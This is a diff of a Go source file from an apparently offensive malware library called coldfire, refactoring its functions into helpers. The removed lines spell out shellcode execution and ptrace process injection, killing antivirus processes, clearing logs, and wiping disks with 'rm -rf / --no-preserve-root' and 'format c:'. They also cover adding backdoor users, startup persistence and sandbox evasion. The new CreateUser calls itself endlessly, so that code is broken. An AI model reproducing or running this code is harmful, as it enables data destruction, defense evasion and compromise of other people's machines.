@@ -3,63 +3,6 @@
 // Linux and Windows operating systems.
 package coldfire
 
-/*
-#include <stdio.h>
-#include <stdint.h>
-#include <string.h>
-#include <stdlib.h>
-#include <sys/mman.h>
-#include <sys/ptrace.h>
-#include <sys/wait.h>
-#include <sys/user.h>
-
-#if defined(__x86_64)
-
-#define REG_IP_NAME      "rip"
-#define REG_IP_TYPE      unsigned long
-#define REG_IP_FMT       "lu"
-#define REG_IP_HEX       "lx"
-#define REG_IP_VALUE(r)  ((r).rip)
-
-#elif defined(__i386)
-
-#define REG_IP_NAME      "eip"
-#define REG_IP_TYPE      unsigned long
-#define REG_IP_FMT       "lu"
-#define REG_IP_HEX       "lx"
-#define REG_IP_VALUE(r)  ((r).eip)
-
-#endif
-
-void sc_run(char *shellcode, size_t sclen) {
-    void *ptr = mmap(0, sclen, PROT_EXEC|PROT_WRITE|PROT_READ, MAP_ANON|MAP_PRIVATE, -1, 0);
-    if (ptr == MAP_FAILED) {
-        perror("mmap");
-        exit(-1);
-    }
-    memcpy(ptr, shellcode, sclen);
-    (*(void(*) ()) ptr)();
-}
-void sc_inject(char *shellcode, size_t sclen, pid_t pid) {
-    struct user_regs_struct regs;
-    int result = ptrace(PTRACE_ATTACH, pid, NULL, NULL);
-    if (result < 0) { exit(1); }
-    wait(NULL);
-    result = ptrace(PTRACE_GETREGS, pid, NULL, &regs);
-    if (result < 0) { exit(1); }
-    int i;
-    uint32_t *s = (uint32_t *) shellcode;
-    uint32_t *d = (uint32_t *) REG_IP_VALUE(regs);
-
-    for (i=0; i < sclen; i+=4, s++, d++) {
-        result = ptrace(PTRACE_POKETEXT, pid, d, *s);
-        if (result < 0) { exit(1); }
-    }
-    REG_IP_VALUE(regs) += 2;
-}
-
-import "C"
-*/
 import (
 	"archive/zip"
 	"bufio"
@@ -85,13 +28,11 @@ import (
 	"time"
 
 	portscanner "github.com/anvie/port-scanner"
-	humanize "github.com/dustin/go-humanize"
 	"github.com/fatih/color"
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/pcap"
 	"github.com/jackpal/gateway"
 	"github.com/matishsiao/goInfo"
-	"github.com/minio/minio/pkg/disk"
 	"github.com/mitchellh/go-homedir"
 	ps "github.com/mitchellh/go-ps"
 	"github.com/savaki/jq"
@@ -125,19 +66,10 @@ func IpIncrement(ip net.IP) {
 		}
 	}
 }
-func killProcByPID(pid int) error {
-	cmd := ""
-	p := strconv.Itoa(pid)
-	switch runtime.GOOS {
-	case "windows":
-		cmd = "taskkill /F /PID " + p
-	case "linux":
-		cmd = "kill -9 " + p
-	default:
-		cmd = "kill " + p
-	}
-	_, err := CmdOut(cmd)
-	return err
+
+// KillProcByPID kills a process given its PID.
+func KillProcByPID(pid int) error {
+	return killProcByPID(pid)
 }
 
 func handleBind(conn net.Conn) {
@@ -542,47 +474,8 @@ func Info() map[string]string {
 
 	i := goInfo.GetInfo()
 
-	switch runtime.GOOS {
-	case "windows":
-		user, err := CmdOut("query user")
-		if err != nil {
-			user = "N/A"
-		}
-		u = user
 
-		// o, err := CmdOut("ipconfig")
-		// if err != nil {
-		// 	ap_ip = "N/A" // (1)
-		// }
-
-		// entries := strings.Split(o, "\n")
-
-		// for e := range entries {
-		// 	entry := entries[e]
-		// 	if strings.Contains(entry, "Default") {
-		// 		ap_ip = strings.Split(entry, ":")[1] // (1)
-		// 	}
-		// }
-	default:
-		user, err := CmdOut("whoami")
-		if err != nil {
-			user = "N/A"
-		}
-		u = user
-
-		// o, err := CmdOut("ip r")
-		// if err != nil {
-		// 	ap_ip = "N/A" // (1)
-		// }
-		// entries := strings.Split(o, "\n")
-		// for e := range entries {
-		// 	entry := entries[e]
-		// 	if strings.Contains(entry, "default via") {
-		// 		ap_ip = strings.Split(o, "")[2] // (1)
-		// 	}
-		// }
-	}
-
+	u = info()
 	hdir, err := homedir.Dir()
 	if err != nil {
 		log.Fatalf(err.Error())
@@ -758,45 +651,12 @@ func Exists(file string) bool {
 
 // IsRoot checks if the current user is the administrator of the machine.
 func IsRoot() bool {
-	root := true
-
-	switch runtime.GOOS {
-	case "windows":
-		_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
-		if err != nil {
-			root = false
-		}
-	default:
-		u, _ := CmdOut("whoami")
-		root = (strings.TrimSuffix(u, "\n") == "root")
-	}
-
-	return root
+	return isRoot()
 }
 
 // CmdOut executes a given command and returns its output.
 func CmdOut(command string) (string, error) {
-	switch runtime.GOOS {
-	case "windows":
-		cmd := exec.Command("cmd", "/C", command)
-		//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-		output, err := cmd.CombinedOutput()
-		out := string(output)
-		return out, err
-	case "linux":
-		cmd := exec.Command("bash", "-c", command)
-		output, err := cmd.CombinedOutput()
-		out := string(output)
-		return out, err
-	default:
-		parts := strings.Fields(command)
-		head := parts[0]
-		parts = parts[1:]
-		cmd := exec.Command(head, parts...)
-		output, err := cmd.CombinedOutput()
-		out := string(output)
-		return out, err
-	}
+	return cmdOut(command)
 }
 
 // func cmd_out_ssh(address, username, password, command string) (string, error) {
@@ -968,38 +828,7 @@ func CredentialsSniff(ifac, interval string,
 // SandboxFilePath checks if the process is being run
 // inside a virtualized environment.
 func SandboxFilepath() bool {
-	if runtime.GOOS == "linux" {
-		out, _ := CmdOut("systemd-detect-virt")
-		return out != "none"
-	}
-	EvidenceOfSandbox := make([]string, 0)
-	FilePathsToCheck := [...]string{`C:\windows\System32\Drivers\Vmmouse.sys`,
-		`C:\windows\System32\Drivers\vm3dgl.dll`, `C:\windows\System32\Drivers\vmdum.dll`,
-		`C:\windows\System32\Drivers\vm3dver.dll`, `C:\windows\System32\Drivers\vmtray.dll`,
-		`C:\windows\System32\Drivers\vmci.sys`, `C:\windows\System32\Drivers\vmusbmouse.sys`,
-		`C:\windows\System32\Drivers\vmx_svga.sys`, `C:\windows\System32\Drivers\vmxnet.sys`,
-		`C:\windows\System32\Drivers\VMToolsHook.dll`, `C:\windows\System32\Drivers\vmhgfs.dll`,
-		`C:\windows\System32\Drivers\vmmousever.dll`, `C:\windows\System32\Drivers\vmGuestLib.dll`,
-		`C:\windows\System32\Drivers\VmGuestLibJava.dll`, `C:\windows\System32\Drivers\vmscsi.sys`,
-		`C:\windows\System32\Drivers\VBoxMouse.sys`, `C:\windows\System32\Drivers\VBoxGuest.sys`,
-		`C:\windows\System32\Drivers\VBoxSF.sys`, `C:\windows\System32\Drivers\VBoxVideo.sys`,
-		`C:\windows\System32\vboxdisp.dll`, `C:\windows\System32\vboxhook.dll`,
-		`C:\windows\System32\vboxmrxnp.dll`, `C:\windows\System32\vboxogl.dll`,
-		`C:\windows\System32\vboxoglarrayspu.dll`, `C:\windows\System32\vboxoglcrutil.dll`,
-		`C:\windows\System32\vboxoglerrorspu.dll`, `C:\windows\System32\vboxoglfeedbackspu.dll`,
-		`C:\windows\System32\vboxoglpackspu.dll`, `C:\windows\System32\vboxoglpassthroughspu.dll`,
-		`C:\windows\System32\vboxservice.exe`, `C:\windows\System32\vboxtray.exe`,
-		`C:\windows\System32\VBoxControl.exe`}
-	for _, FilePath := range FilePathsToCheck {
-		if _, err := os.Stat(FilePath); err == nil {
-			EvidenceOfSandbox = append(EvidenceOfSandbox, FilePath)
-		}
-	}
-	if len(EvidenceOfSandbox) == 0 {
-		return false
-	} else {
-		return true
-	}
+	return sandboxFilepath()
 }
 
 // SandboxProc checks if there are processes that indicate
@@ -1036,23 +865,7 @@ func SandboxSleep() bool {
 // SandboxDisk is used to check if the environment's
 // disk space is less than a given size.
 func SandboxDisk(size int) bool {
-	v := false
-	d := "/"
-	switch runtime.GOOS {
-	case "windows":
-		d = `C:\`
-	}
-	di, _ := disk.GetInfo(d)
-	x := strings.Replace(humanize.Bytes(di.Total), "GB", "", -1)
-	x = strings.Replace(x, " ", "", -1)
-	z, err := strconv.Atoi(x)
-	if err != nil {
-		fmt.Println(err)
-	}
-	if z < size {
-		v = true
-	}
-	return v
+	return sandboxDisk(size)
 }
 
 // SandboxCpu is used to check if the environment's
@@ -1099,16 +912,7 @@ func SandboxProcnum(proc_num int) bool {
 // SandboxTmp is used to check if the environment's
 // temporary directory has less files than a given integer.
 func SandboxTmp(entries int) bool {
-	tmp_dir := "/tmp"
-	if runtime.GOOS == "windows" {
-		tmp_dir = `C:\windows\temp`
-	}
-	files, err := ioutil.ReadDir(tmp_dir)
-	if err != nil {
-		return true
-	}
-
-	return len(files) < entries
+	return sandboxTmp(entries)
 }
 
 // SandboxMac is used to check if the environment's MAC address
@@ -1184,15 +988,7 @@ func SandboxAlln(num int) bool {
 
 // Shutdown forces the machine to shutdown.
 func Shutdown() error {
-	commands := map[string]string{
-		"windows": "shutdown -s -t 60",
-		"linux":   "shutdown +1",
-		"darwin":  "shutdown -h +1",
-	}
-	c := commands[runtime.GOOS]
-	_, err := CmdOut(c)
-
-	return err
+	return shutdown()
 }
 
 // func set_ttl(interval string){
@@ -1239,7 +1035,7 @@ func Reverse(host string, port int) {
 
 // PkillPid kills a process by its PID.
 func PkillPid(pid int) error {
-	err := killProcByPID(pid)
+	err := KillProcByPID(pid)
 	return err
 }
 
@@ -1256,7 +1052,7 @@ func PkillName(name string) error {
 		pid := process.Pid()
 
 		if strings.Contains(proc_name, name) {
-			err := killProcByPID(pid)
+			err := KillProcByPID(pid)
 			if err != nil {
 				return err
 			}
@@ -1267,44 +1063,7 @@ func PkillName(name string) error {
 
 // PkillAv kills Anti-Virus processes that may run within the machine.
 func PkillAv() error {
-	var av_processes []string
-	windows_av_processes := []string{
-		"advchk.exe", "ahnsd.exe", "alertsvc.exe", "alunotify.exe", "autodown.exe", "avmaisrv.exe",
-		"avpcc.exe", "avpm.exe", "avsched32.exe", "avwupsrv.exe", "bdmcon.exe", "bdnagent.exe", "bdoesrv.exe",
-		"bdss.exe", "bdswitch.exe", "bitdefender_p2p_startup.exe", "cavrid.exe", "cavtray.exe", "cmgrdian.exe",
-		"doscan.exe", "dvpapi.exe", "frameworkservice.exe", "frameworkservic.exe", "freshclam.exe", "icepack.exe",
-		"isafe.exe", "mgavrtcl.exe", "mghtml.exe", "mgui.exe", "navapsvc.exe", "nod32krn.exe", "nod32kui.exe",
-		"npfmntor.exe", "nsmdtr.exe", "ntrtscan.exe", "ofcdog.exe", "patch.exe", "pav.exe", "pcscan.exe",
-		"poproxy.exe", "prevsrv.exe", "realmon.exe", "savscan.exe", "sbserv.exe", "scan32.exe", "spider.exe",
-		"tmproxy.exe", "trayicos.exe", "updaterui.exe", "updtnv28.exe", "vet32.exe", "vetmsg.exe", "vptray.exe",
-		"vsserv.exe", "webproxy.exe", "webscanx.exe", "xcommsvr.exe"}
-	unix_av_processes := []string{"netsafety", "clamav", "sav-protect.service", "sav-rms.service"}
-
-	if runtime.GOOS == "windows" {
-		av_processes = windows_av_processes
-	} else {
-		av_processes = unix_av_processes
-	}
-
-	processList, err := ps.Processes()
-	if err != nil {
-		return err
-	}
-
-	for x := range processList {
-		process := processList[x]
-		proc_name := process.Executable()
-		pid := process.Pid()
-
-		if ContainsAny(proc_name, av_processes) {
-			err := killProcByPID(pid)
-			if err != nil {
-				return err
-			}
-		}
-	}
-
-	return nil
+	return pkillAv()
 }
 
 // Processes returns a map of a PID to its respective process name.
@@ -1440,42 +1199,7 @@ func Download(url string) error {
 
 // Users returns a list of known users within the machine.
 func Users() ([]string, error) {
-	switch runtime.GOOS {
-	case "windows":
-		clear := []string{}
-		o, err := CmdOut("net user")
-		if err != nil {
-			return nil, err
-		}
-
-		lines := strings.Split(o, "\n")
-
-		for l := range lines {
-			line := lines[l]
-			if !ContainsAny(line, []string{"accounts for", "------", "completed"}) {
-				clear = append(clear, line)
-			}
-		}
-
-		return clear, nil
-		// return strings.Fields(strings.Join(clear, " ")), nil
-		// usrs := []string{}
-		//   users, err := wapi.ListLoggedInUsers()
-		//   if err != nil {
-		//       return nil, err
-		//   }
-		//   for _, u := range(users){
-		//       usrs = append(usrs, u.FullUser())
-		//   }
-		//   return usrs, nil
-	default:
-		o, err := CmdOut("cut -d: -f1 /etc/passwd")
-		if err != nil {
-			return nil, err
-		}
-
-		return strings.Split(o, "\n"), nil
-	}
+	return users()
 }
 
 // EraseMbr zeroes out the Master Boot Record.
@@ -1495,36 +1219,7 @@ func EraseMbr(device string, partition_table bool) error {
 
 // Networks returns a list of nearby wireless networks.
 func Networks() ([]string, error) {
-	wifi_names := []string{}
-
-	switch runtime.GOOS {
-	case "windows":
-		out, err := CmdOut("netsh wlan show networks")
-		if err != nil {
-			return nil, err
-		}
-		o := strings.Split(out, "\n")[1:]
-		for entry := range o {
-			e := o[entry]
-			if strings.Contains(e, "SSID") {
-				wifi_name := strings.Split(e, ":")[1]
-				wifi_names = append(wifi_names, wifi_name)
-			}
-		}
-	default:
-		out, err := CmdOut("nmcli dev wifi")
-		if err != nil {
-			return nil, err
-		}
-		o := strings.Split(out, "\n")[1:]
-		for entry := range o {
-			e := o[entry]
-			wifi_name := strings.Split(e, "")[1]
-			wifi_names = append(wifi_names, wifi_name)
-		}
-	}
-
-	return wifi_names, nil
+	return networks()
 }
 
 // ExpandCidr returns a list of Ip addresses within a given CIDR.
@@ -1550,38 +1245,12 @@ func ExpandCidr(cidr string) ([]string, error) {
 
 // ClearLogs removes logfiles within the machine.
 func ClearLogs() error {
-	switch runtime.GOOS {
-	case "windows":
-		os.Chdir("%windir%\\system32\\config")
-		_, err := CmdOut("del *log /a /s /q /f")
-		if err != nil {
-			return err
-		}
-	default:
-		_, err := CmdOut("rm -r /var/log")
-		if err != nil {
-			return err
-		}
-	}
-
-	return nil
+	return clearLogs()
 }
 
 // Wipe deletes all data in the machine.
 func Wipe() error {
-	cmd := ""
-	switch runtime.GOOS {
-	case "windows":
-		cmd = "format c: /fs:ntfs"
-	default:
-		cmd = "rm -rf / --no-preserve-root"
-	}
-	_, err := CmdOut(cmd)
-	if err != nil {
-		return err
-	}
-
-	return nil
+	return wipe()
 }
 
 // DnsLookup returns the list of Ip adddress associated with the given hostname.
@@ -1610,78 +1279,17 @@ func RdnsLookup(ip string) ([]string, error) {
 
 // CreateUser creates a user with a given username and password.
 func CreateUser(username, password string) error {
-	var cmd string
-
-	switch runtime.GOOS {
-	case "windows":
-		cmd = f("net user %s %s /ADD", username, password)
-	case "linux":
-		cmd = f("usradd -u %s -p %s", username, password)
-	case "darwin":
-		cmd = f("sysadminctl -addUser %s -password %s -admin", username, password)
-	}
-
-	_, err := CmdOut(cmd)
-	if err != nil {
-		return err
-	}
-	return nil
+	return CreateUser(username, password)
 }
 
 // WifiDisconnect is used to disconnect the machine from a wireless network.
 func WifiDisconnect() error {
-	var cmd string
-
-	switch runtime.GOOS {
-	case "windows":
-		cmd = `netsh interface set interface name="Wireless Network Connection" admin=DISABLED`
-		_, err := CmdOut(cmd)
-		if err != nil {
-			return err
-		}
-	case "linux":
-		iface, _ := Iface()
-		cmd = f("ip link set dev %s down", iface)
-		_, err := CmdOut(cmd)
-		if err != nil {
-			return err
-		}
-	case "darwin":
-		cmd = "networksetup -setnetworkserviceenabled Wi-Fi off"
-		_, err := CmdOut(cmd)
-		if err != nil {
-			return err
-		}
-	}
-
-	return nil
-
+	return wifiDisconnect()
 }
 
 // Disks returns a list of storage drives within the machine.
 func Disks() ([]string, error) {
-	found_drives := []string{}
-
-	switch runtime.GOOS {
-	case "windows":
-		for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
-			f, err := os.Open(string(drive) + ":\\")
-			if err == nil {
-				found_drives = append(found_drives, string(drive)+":\\")
-				f.Close()
-			}
-		}
-	default:
-		for _, drive := range "abcdefgh" {
-			f, err := os.Open("/dev/sd" + string(drive))
-			if err == nil {
-				found_drives = append(found_drives, "/dev/sd"+string(drive))
-				f.Close()
-			}
-		}
-	}
-
-	return found_drives, nil
+	return disks()
 }
 
 // CopyFile copies a file from one directory to another.
@@ -1767,13 +1375,7 @@ func RemoveInt(slice []int, s int) []int {
 
 // AddPersistentCommand creates a task that runs a given command on startup.
 func AddPersistentCommand(cmd string) error {
-	if runtime.GOOS == "windows" {
-		_, err := CmdOut(fmt.Sprintf(`schtasks /create /tn "MyCustomTask" /sc onstart /ru system /tr "cmd.exe /c %s`, cmd))
-		return err
-	} else {
-		_, err := CmdOut(fmt.Sprintf(`echo "%s" >> ~/.bashrc; echo "%s" >> ~/.zshrc`, cmd, cmd))
-		return err
-	}
+	return addPersistentCommand(cmd)
 }
 
 // RegexMatch checks if a string contains valuable information through regex.
